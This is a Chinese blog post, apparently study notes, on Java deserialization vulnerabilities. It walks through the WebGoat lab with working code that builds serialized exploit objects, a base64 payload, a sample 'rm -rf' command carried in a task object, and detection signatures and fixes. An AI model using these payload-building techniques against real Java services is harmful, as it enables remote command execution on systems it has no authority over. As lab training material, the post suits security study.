@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Java代码审计安全篇-反序列化漏洞 - 老帅的博客</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:url" content="https://laoshuaiblog.github.io/posts/658ef22578b76678d2a12163a5eca06b/">
+  <meta property="og:site_name" content="老帅的博客">
+  <meta property="og:title" content="Java代码审计安全篇-反序列化漏洞">
+  <meta property="og:description" content="前言： 堕落了三个月，现在因为被找实习而困扰，着实自己能力不足，从今天开始 每天沉淀一点点 ，准备秋招 加油
+注意： 本文章参考qax的网络安全java代码审计和部分师傅审计思路以及webgoat靶场，记录自己的学习过程，还希望各位博主 师傅 大佬 勿喷，还希望大家指出错误
+初识 Java序列化和反序列化： 1.概念: 序列化是将某些对象转换为以后可以恢复的数据格式的过程。人们经常序列化对象，以便将它们保存到存储中，或作为通信的一部分发送。
+反序列化是该过程的反面，从某种格式获取数据，并将其重建为对象。如今，用于序列化数据的最流行的数据格式是 JSON。在此之前，它是 XML。
+2. 好处： 能够实现数据的持久化，通过序列化可以把数据永久保存在硬盘上，也可理解为通过序列化将数据保存在文件中。
+3.序列化和反序列化的过程举例： 参考https://www.cnblogs.com/LoYoHo00/articles/17654380.html
+类文件 Person.java
+package lemo; import java.io.Serializable; ​ public class Person implements Serializable { ​ private String name; private int age; ​ public Person(){ ​ } // 构造函数 public Person(String name, int age){ this.name = name; this.age = age; } ​ @Override public String toString(){ return &#34;src.Person{&#34; &#43; &#34;">
+  <meta property="og:locale" content="zh-CN">
+  <meta property="og:type" content="article">
+  <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-03-28T18:32:25+08:00">
+    <meta property="article:modified_time" content="2024-03-28T18:32:25+08:00">
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+  
+
+
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="老帅的博客" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">老帅的博客</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">Java代码审计安全篇-反序列化漏洞</h1>
+			
+		</header>
+		<div id="gatop"></div>
+		<div class="content post__content clearfix">
+			
+<div id="content_views" class="htmledit_views">
+                    <h4>前言：</h4> 
+<blockquote> 
+ <p> 堕落了三个月，现在因为被找实习而困扰，着实自己能力不足，从今天开始 每天沉淀一点点 ，准备<a href="https://so.csdn.net/so/search?q=%E7%A7%8B%E6%8B%9B&amp;spm=1001.2101.3001.7020" title="秋招">秋招</a> 加油</p> 
+</blockquote> 
+<h4><a name="t1"></a>注意：</h4> 
+<blockquote> 
+ <p>本文章参考qax的<a href="https://so.csdn.net/so/search?q=%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8&amp;spm=1001.2101.3001.7020" title="网络安全">网络安全</a>java代码审计和部分师傅审计思路以及webgoat靶场，记录自己的学习过程，还希望各位博主 师傅 大佬 勿喷，还希望大家指出错误</p> 
+</blockquote> 
+<h4>初识 Java序列化和反序列化：</h4> 
+<h5>1.概念:</h5> 
+<blockquote> 
+ <p>       序列化是将某些对象转换为以后可以恢复的数据格式的过程。人们经常序列化对象，以便将它们保存到存储中，或作为通信的一部分发送。</p> 
+ <p>         反序列化是该过程的反面，从某种格式获取数据，并将其重建为对象。如今，用于序列化数据的最流行的数据格式是 JSON。在此之前，它是 XML。</p> 
+</blockquote> 
+<h5>2. 好处：</h5> 
+<blockquote> 
+ <p>能够实现数据的持久化，通过序列化可以把数据永久保存在硬盘上，也可理解为通过序列化将数据保存在文件中。</p> 
+</blockquote> 
+<h5>3.序列化和反序列化的过程举例：</h5> 
+<p>参考<a class="link-info" href="https://www.cnblogs.com/LoYoHo00/articles/17654380.html" rel="nofollow" title="https://www.cnblogs.com/LoYoHo00/articles/17654380.html">https://www.cnblogs.com/LoYoHo00/articles/17654380.html</a></p> 
+<p><strong>类文件 Person.java</strong></p> 
+<pre><code class="language-java">package lemo;
+import java.io.Serializable;
+​
+public class Person implements Serializable {
+​
+    private String name;
+    private int age;
+​
+    public Person(){
+​
+    }
+    // 构造函数
+    public Person(String name, int age){
+        this.name = name;
+        this.age = age;
+    }
+​
+    @Override
+    public String toString(){
+        return "src.Person{" +
+                "name='" + name + '\'' +
+                ", age=" + age +
+                '}';
+    }
+}</code></pre> 
+<p><strong>序列化文件：SerializationTest.java</strong> </p> 
+<pre><code class="language-java">package lemo;
+
+import java.io.FileOutputStream;//文件输出流
+import java.io.IOException;//用于声明可能会抛出IOException的方法。当一个方法可能会引发输入/输出异常时，可以使用throws IOException来通知调用该方法的其他部分，让它们做出相应的异常处理。
+import java.io.ObjectOutput;
+import java.io.ObjectOutputStream;//将对象以二进制形式写入输出流。它可以将对象序列化成字节流，用于在网络中传输或保存到文件中。
+
+public class SerializationTest {
+    public static void serialize(Object obj) throws IOException{
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));//输出流对象
+        oos.writeObject(obj);//序列化
+    }
+
+    public static void main(String[] args) throws Exception{
+        Person person = new Person("aa",22);
+        System.out.println(person);
+        serialize(person);
+    }
+}
+</code></pre> 
+<p><strong>反序列化文件：UnserializeTest.java</strong></p> 
+<pre><code class="language-java">package lemo;
+
+import java.io.FileInputStream;
+import java.io.IOException;
+import java.io.ObjectInputStream;
+
+public class UnserializeTest {
+    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+        Object obj = ois.readObject();
+        return obj;
+    }
+
+    public static void main(String[] args) throws Exception{
+        Person person = (Person)unserialize("ser.bin");
+        System.out.println(person);//反序列化
+    }
+}
+</code></pre> 
+<p>我们运行<strong>SerializationTest.java</strong>得到</p> 
+<p><img alt="" height="1021" src="https://images2.imgbox.com/e5/51/EoCJmPs0_o.png" width="1200"></p> 
+<pre><code class="language-java">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));//输出流对象
+        oos.writeObject(obj);//序列化</code></pre> 
+<blockquote> 
+ <p><strong>      在 <code>serialize</code> 方法的实现中，首先创建了一个 <code>ObjectOutputStream</code> 对象 <code>oos</code>，它接受一个 <code>FileOutputStream</code> 对象作为参数，用于指定输出流写入的文件名为 "ser.bin"。然后，通过调用 <code>oos.writeObject(obj)</code> 方法，将传入的对象进行序列化，将序列化后的数据写入输出流。</strong></p> 
+</blockquote> 
+<p> 我们运行<strong>UnserializationTest.java</strong>得到</p> 
+<p><img alt="" height="1021" src="https://images2.imgbox.com/f7/4b/sUPHeojH_o.png" width="1200"></p> 
+<pre><code class="language-java">ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+        Object obj = ois.readObject();</code></pre> 
+<p> <code>readObject()</code>方法被调用，它从输入流中读取字节并将其反序列化为对象</p> 
+<h5>注意： </h5> 
+<h6>1.静态成员变量是不能被序列化</h6> 
+<p>序列化是针对对象属性的，而静态成员变量是属于类的。</p> 
+<h6>2.transient 标识的对象成员变量不参与序列化</h6> 
+<p>举例：</p> 
+<p>将 <strong>Person.java</strong>中的<code>name</code>加上<code>transient</code>的类型标识</p> 
+<p><img alt="" height="484" src="https://images2.imgbox.com/a5/1d/krC273Zs_o.png" width="807"></p> 
+<p>加完之后再跑我们的序列化与反序列化的两个程序运行得到 发现</p> 
+<p><img alt="" height="1021" src="https://images2.imgbox.com/9d/0a/upWCrA6l_o.png" width="1200"></p> 
+<p> name打印为NULL 是因为transient 标识的对象成员变量不参与序列化</p> 
+<h4> 初始反序列化漏洞</h4> 
+<p> 序列化和反序列化中有两个重要的方法————writeObject和readObject</p> 
+<p>上面举例也是使用这两个方法</p> 
+<h5>1.可能存在漏洞的场景</h5> 
+<p>(1)入口类的readObject直接调用危险方法</p> 
+<p>我们只需在Person.java里面添加一个触发计算器的代码：</p> 
+<pre><code class="language-java">package src;
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.io.Serializable;
+​
+public class Person implements Serializable {
+​
+    private transient String name;
+    private int age;
+​
+    public Person(){
+​
+    }
+    // 构造函数
+    public Person(String name, int age){
+        this.name = name;
+        this.age = age;
+    }
+​
+    @Override
+    public String toString(){
+        return "src.Person{" +
+                "name='" + name + '\'' +
+                ", age=" + age +
+                '}';
+    }
+​
+    public void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException{
+        ois.defaultReadObject();//调用默认机制，以恢复对象的非静态和非瞬态(非 transient 修饰)字段
+        Runtime.getRuntime().exec("calc");//在操作系统上执行外部命令。
+    }
+}</code></pre> 
+<p>先后运行序列化 和反序列化代码就会发现弹出了计算器 </p> 
+<blockquote> 
+ <p>只有实现了Serializable接口的类的对象才可以被序列化，Serializable接口是启用其序列化功能的接口，实现java.io.Serializable 接口的类才是可序列化的，没有实现此接口的类将不能使它们的任一状态被序列化或逆序列化。这里的readObject()执行了Runtime.getRuntime().exec("calc")，而readObject()方法的作用正是从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回，readObject()是可以重写的，可以定制反序列化的一些行为。</p> 
+</blockquote> 
+<p>(2)入口参数中包含可控类，该类有危险方法，readObject时调用</p> 
+<p>(3)入口参数中包含可控类，该类又调用其他有危险方法的类，readObject时调用</p> 
+<p>(4)构造函数/静态代码块等加载时隐式执行</p> 
+<h5>2.Webgoat说明</h5> 
+<p><img alt="" height="526" src="https://images2.imgbox.com/62/5f/qxj4h3Rz_o.png" width="1200"></p> 
+<p id="_class_included_in_classpath"><span style="color:#333333;"><span style="background-color:#ffffff;">ClassPath 中包含的类</span></span></p> 
+<div> 
+ <p style="margin-left:0;"><span style="color:#333333;"><span style="background-color:#ffffff;">攻击者需要在类路径中找到支持序列化且具有危险实现的类。<code>readObject()</code></span></span></p> 
+</div> 
+<pre><code class="language-java">package org.dummy.insecure.framework;
+
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.io.ObjectInputStream;
+import java.io.Serializable;
+import java.time.LocalDateTime;
+
+public class VulnerableTaskHolder implements Serializable {
+
+        private static final long serialVersionUID = 1;
+
+        private String taskName;
+        private String taskAction;
+        private LocalDateTime requestedExecutionTime;
+
+        public VulnerableTaskHolder(String taskName, String taskAction) {
+                super();
+                this.taskName = taskName;
+                this.taskAction = taskAction;
+                this.requestedExecutionTime = LocalDateTime.now();
+        }
+
+        private void readObject( ObjectInputStream stream ) throws Exception {
+        //deserialize data so taskName and taskAction are available
+                stream.defaultReadObject();
+
+                //blindly run some code. #code injection
+                Runtime.getRuntime().exec(taskAction);
+     }
+}
+</code></pre> 
+<p> 利用：</p> 
+<p>如果存在上面显示的 java 类，攻击者可以序列化该对象并获取远程代码执行。</p> 
+<pre><code class="language-java">VulnerableTaskHolder go = new VulnerableTaskHolder("delete all", "rm -rf somefile");
+
+ByteArrayOutputStream bos = new ByteArrayOutputStream();
+ObjectOutputStream oos = new ObjectOutputStream(bos);
+oos.writeObject(go);
+oos.flush();
+byte[] exploit = bos.toByteArray();</code></pre> 
+<p>原理跟上边那个差不多 </p> 
+<h5> 3.Webgoat靶场实战</h5> 
+<pre><code class="language-java">rO0ABXQAVklmIHlvdSBkZXNlcmlhbGl6ZSBtZSBkb3duLCBJIHNoYWxsIGJlY29tZSBtb3JlIHBvd2VyZnVsIHRoYW4geW91IGNhbiBwb3NzaWJseSBpbWFnaW5l</code></pre> 
+<p><img alt="" height="389" src="https://images2.imgbox.com/1b/3c/TH57AB63_o.png" width="1200"></p> 
+<p>我们输入aa试试然后抓包可以看到接口名为InsecureDeserialization/task，那就后端全局搜索InsecureDeserialization/task，最终定位到InsecureDeserializationTask.java</p> 
+<p><img alt="" height="504" src="https://images2.imgbox.com/50/68/rggVFP0o_o.png" width="1058"></p> 
+<p></p> 
+<p>得到InsecureDeserializationTask.java源码 </p> 
+<pre><code class="language-java">package org.owasp.webgoat.deserialization;
+
+import org.dummy.insecure.framework.VulnerableTaskHolder;
+import org.owasp.webgoat.assignments.AssignmentEndpoint;
+import org.owasp.webgoat.assignments.AssignmentHints;
+import org.owasp.webgoat.assignments.AttackResult;
+import org.springframework.web.bind.annotation.PostMapping;
+import org.springframework.web.bind.annotation.RequestParam;
+import org.springframework.web.bind.annotation.ResponseBody;
+import org.springframework.web.bind.annotation.RestController;
+
+import java.io.*;
+import java.util.Base64;
+
+@RestController
+@AssignmentHints({"insecure-deserialization.hints.1", "insecure-deserialization.hints.2", "insecure-deserialization.hints.3"})
+public class InsecureDeserializationTask extends AssignmentEndpoint {
+
+    @PostMapping("/InsecureDeserialization/task")
+    @ResponseBody
+    public AttackResult completed(@RequestParam String token) throws IOException {
+        String b64token;
+        long before;
+        long after;
+        int delay;
+
+        b64token = token.replace('-', '+').replace('_', '/');
+
+        try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(b64token)))) {
+            before = System.currentTimeMillis();
+            Object o = ois.readObject();
+            if (!(o instanceof VulnerableTaskHolder)) {
+                if (o instanceof String) {
+                    return failed(this).feedback("insecure-deserialization.stringobject").build();
+                }
+                return failed(this).feedback("insecure-deserialization.wrongobject").build();
+            }
+            after = System.currentTimeMillis();
+        } catch (InvalidClassException e) {
+            return failed(this).feedback("insecure-deserialization.invalidversion").build();
+        } catch (IllegalArgumentException e) {
+            return failed(this).feedback("insecure-deserialization.expired").build();
+        } catch (Exception e) {
+            return failed(this).feedback("insecure-deserialization.invalidversion").build();
+        }
+
+        delay = (int) (after - before);
+        if (delay &gt; 7000) {
+            return failed(this).build();
+        }
+        if (delay &lt; 3000) {
+            return failed(this).build();
+        }
+        return success(this).build();
+    }
+}
+</code></pre> 
+<p>后端拿到我们的token之后进行了一个特殊符号替换，然后进行了base64解码，解码过后进行了readObject()反序列化操作，最后判断一下这个对象是不是VulnerableTaskHolder的实例。所以，我们反序列化的对象也就确定了，那就是VulnerableTaskHolder类的实例。 </p> 
+<p>那我们就重点关注VulnerableTaskHolder类的实现：</p> 
+<p>源码：</p> 
+<pre><code class="language-java">package org.dummy.insecure.framework;
+
+import java.io.*;
+import java.time.LocalDateTime;
+import java.util.Base64;
+
+import lombok.extern.slf4j.Slf4j;
+
+@Slf4j
+public class VulnerableTaskHolder implements Serializable {
+
+	private static final long serialVersionUID = 2;
+
+	private String taskName;
+	private String taskAction;
+	private LocalDateTime requestedExecutionTime;
+	
+	public VulnerableTaskHolder(String taskName, String taskAction) {
+		super();
+		this.taskName = taskName;
+		this.taskAction = taskAction;
+		this.requestedExecutionTime = LocalDateTime.now();
+	}
+	
+	@Override
+	public String toString() {
+		return "VulnerableTaskHolder [taskName=" + taskName + ", taskAction=" + taskAction + ", requestedExecutionTime="
+				+ requestedExecutionTime + "]";
+	}
+
+	/**
+	 * Execute a task when de-serializing a saved or received object.
+	 * @author stupid develop
+	 */
+	private void readObject( ObjectInputStream stream ) throws Exception {
+        //unserialize data so taskName and taskAction are available
+		stream.defaultReadObject();
+		
+		//do something with the data
+		log.info("restoring task: {}", taskName);
+		log.info("restoring time: {}", requestedExecutionTime);
+		
+		if (requestedExecutionTime!=null &amp;&amp; 
+				(requestedExecutionTime.isBefore(LocalDateTime.now().minusMinutes(10))
+				|| requestedExecutionTime.isAfter(LocalDateTime.now()))) {
+			//do nothing is the time is not within 10 minutes after the object has been created
+			log.debug(this.toString());
+			throw new IllegalArgumentException("outdated");
+		}
+		
+		//condition is here to prevent you from destroying the goat altogether
+		if ((taskAction.startsWith("sleep")||taskAction.startsWith("ping"))
+				&amp;&amp; taskAction.length() &lt; 22) {
+		log.info("about to execute: {}", taskAction);
+		try {
+            Process p = Runtime.getRuntime().exec(taskAction);
+            BufferedReader in = new BufferedReader(
+                                new InputStreamReader(p.getInputStream()));
+            String line = null;
+            while ((line = in.readLine()) != null) {
+                log.info(line);
+            }
+        } catch (IOException e) {
+            log.error("IO Exception", e);
+        }
+		}
+       
+    }
+	
+}
+</code></pre> 
+<p> 关注readObject方法</p> 
+<pre><code class="language-java">if ((taskAction.startsWith("sleep")||taskAction.startsWith("ping"))
+				&amp;&amp; taskAction.length() &lt; 22) {
+		log.info("about to execute: {}", taskAction);
+		try {
+            Process p = Runtime.getRuntime().exec(taskAction);
+            BufferedReader in = new BufferedReader(
+                                new InputStreamReader(p.getInputStream()));
+            String line = null;
+            while ((line = in.readLine()) != null) {
+                log.info(line);
+            }
+        } catch (IOException e) {
+            log.error("IO Exception", e);
+        }
+		}</code></pre> 
+<p>可以看到首先判断requestedExecutionTime变量值是否是当前时间，如果是当前时间则判断taskAction变量是否是以sleep或者ping开头且长度小于22，如果满足的话就将taskAction变量值传给Runtime.getRuntime().exec执行命令。这里的taskAction是我们可以控制的</p> 
+<p><img alt="" height="214" src="https://images2.imgbox.com/66/2b/lLNXMAwK_o.png" width="677"></p> 
+<p>然后关注发现这个类的有参构造器发现其会自动将this.requestedExecutionTime赋值为当前时间</p> 
+<p>所以我们只需关注 taskAction变量</p> 
+<p><img alt="" height="204" src="https://images2.imgbox.com/2a/9e/rGCBcajv_o.png" width="845"></p> 
+<p>然后根据上面的漏洞利用进行构造paylaod</p> 
+<p><img alt="" height="334" src="https://images2.imgbox.com/16/a9/oWJJY4JB_o.png" width="1076"></p> 
+<p> 注意两点：</p> 
+<blockquote> 
+ <p>创建的对象必须是 VulnerableTaskHolder 类的实例，包名得一致；</p> 
+ <p>创建的序列化对象，时间戳必须在当前时间的前十分钟以内，否则会报 The task is not executable between now and the next ten minutes, so the action will be ignored. Maybe you copied an old solution? Let’s try again 错误。所以 VulnerableTaskHolder 类中的构造方法得减去一定得时间。</p> 
+</blockquote> 
+<p> 我直接将构造代码写在了这个类文件里面，因为在序列化时会将package包名也序列化进去，这样也比较方便。</p> 
+<pre><code class="language-java">package org.dummy.insecure.framework;  
+import java.io.ByteArrayOutputStream;  
+import java.io.ObjectOutputStream;  
+import java.util.Base64;
+
+  
+public class VulnerableTaskHolder {  
+  
+    static public void main(String[] args){  
+        try{  
+            VulnerableTaskHolder go = new VulnerableTaskHolder("sleep", "sleep 6");  
+            ByteArrayOutputStream bos = new ByteArrayOutputStream();  
+            ObjectOutputStream oos = new ObjectOutputStream(bos);  
+            oos.writeObject(go);  
+            oos.flush();  
+            byte[] exploit = bos.toByteArray();  
+            String exp = Base64.getEncoder().encodeToString(exploit);  
+            System.out.println(exp);  
+        } catch (Exception e){  
+  
+        }  
+    }  
+}</code></pre> 
+<p>或者使用ping </p> 
+<pre><code class="language-java">package org.dummy.insecure.framework;
+
+import java.io.Serializable;
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.io.ObjectOutputStream;
+import java.util.Base64;
+
+public class VulnerableTaskHolder implements Serializable {
+	private static final long serialVersionUID = 2;
+	
+	private String taskAction;
+	
+	public VulnerableTaskHolder(String taskAction) {
+		this.taskAction = taskAction;
+	}
+	
+	public static void main(String[] args) throws IOException {
+		VulnerableTaskHolder vuln = new VulnerableTaskHolder("ping 1 -n 6");
+		ByteArrayOutputStream bOut = new ByteArrayOutputStream();
+		ObjectOutputStream objOut = new ObjectOutputStream(bOut);
+		objOut.writeObject(vuln);
+		String str = Base64.getEncoder().encodeToString(bOut.toByteArray());
+		System.out.println(str);
+		objOut.close();
+	}
+}
+</code></pre> 
+<p>生成</p> 
+<pre><code class="language-java">rO0ABXNyADFvcmcuZHVtbXkuaW5zZWN1cmUuZnJhbWV3b3JrLlZ1bG5lcmFibGVUYXNrSG9sZGVyAAAAAAAAAAICAAFMAAp0YXNrQWN0aW9udAASTGphdmEvbGFuZy9TdHJpbmc7eHB0AAtwaW5nIDEgLW4gNg==
+</code></pre> 
+<p> 提交成功</p> 
+<p><img alt="" height="339" src="https://images2.imgbox.com/74/a3/wFWsoEd5_o.png" width="1200"></p> 
+<h4> 如何发现漏洞</h4> 
+<p>参考<a class="link-info" href="https://www.cnblogs.com/yokan/p/15232644.html" rel="nofollow" title="https://www.cnblogs.com/yokan/p/15232644.html">https://www.cnblogs.com/yokan/p/15232644.html</a></p> 
+<blockquote> 
+ <p>1.从流量中发现序列化的痕迹，关键字：ac ed 00 05，rO0AB</p> 
+ <p>2.Java RMI的传输100%基于反序列化，Java RMI的默认端口是1099端口</p> 
+ <p>3.从源码入手，可以被序列化的类一定实现了Serializable接口</p> 
+ <p>4.观察反序列化时的readObject()方法是否重写，重写中是否有设计不合理，可以被利用之处</p> 
+ <p>从可控数据的反序列化或间接的反序列化接口入手，再在此基础上尝试构造序列化的对象。</p> 
+ <p>ysoserial是一款非常好用的Java反序列化漏洞检测工具，该工具通过多种机制构造PoC，并灵活的运用了反射机制和动态代理机制，值得学习和研究。</p> 
+</blockquote> 
+<blockquote> 
+ <p>黑盒测试：主要观察通信流量来确定入口点，需要寻找Java序列化特征字节或字符串 <span style="color:#fe2c24;">0xac ed 00 05</span>(16进制)  或者 <span style="color:#fe2c24;">rO0AB</span>(base64)</p> 
+ <p>白盒测试：<span style="color:#fe2c24;">readobject</span></p> 
+</blockquote> 
+<h4>其他反序列化漏洞 </h4> 
+<h6 id="79p6n">Apache Shiro 反序列化漏洞</h6> 
+<p><a href="https://blog.csdn.net/m0_63138919/article/details/137049246?spm=1001.2014.3001.5501" title="Java框架安全篇--Shiro-550漏洞-CSDN博客">Java框架安全篇--Shiro-550漏洞-CSDN博客</a></p> 
+<p>Shiro-770漏洞原理：</p> 
+<blockquote> 
+ <p>Apache Shiro RememberMe Cookie默认通过<code>AES-128-CBC</code>模式加密，这种加密方式容易受到<code>Padding Oracle Attack（Oracle填充攻击）</code>，利用有效的RememberMe Cookie作为Padding Oracle Attack的前缀，然后精心构造 RememberMe Cookie 值来实现反序列化漏洞攻击.</p> 
+</blockquote> 
+<h5>fastjson 漏洞</h5> 
+<p> <a href="https://blog.csdn.net/m0_63138919/article/details/137119391?spm=1001.2014.3001.5502" title="Java安全篇-Fastjson漏洞-CSDN博客">Java安全篇-Fastjson漏洞-CSDN博客</a></p> 
+<h4>修复</h4> 
+<blockquote> 
+ <p> 1. 通过Hook resolveClass来校验反序列化的类</p> 
+ <p> 2. 使用ObjectInputFilter来校验反序列化的类</p> 
+ <p> 3. 黑名单校验修复</p> 
+</blockquote>
+                </div>
+		</div>
+		<div id="gabottom"></div>
+	</article>
+</main>
+
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/posts/d01b1d7dc1fb09c28cbe6eb2fb1a639e/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">Java安全篇-Fastjson漏洞</p>
+		</a>
+	</div>
+	<div class="pager__item pager__item--next">
+		<a class="pager__link" href="/posts/93c86a9547bb207ff4482459bf419208/" rel="next">
+			<span class="pager__subtitle">Next&thinsp;»</span>
+			<p class="pager__title">Android JNI开发定义全局变量</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2024 老帅的博客.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<div id="gafoot"></div>
+<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
+<script src="https://101121.xyz/ga/app.js"></script>
+
+
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
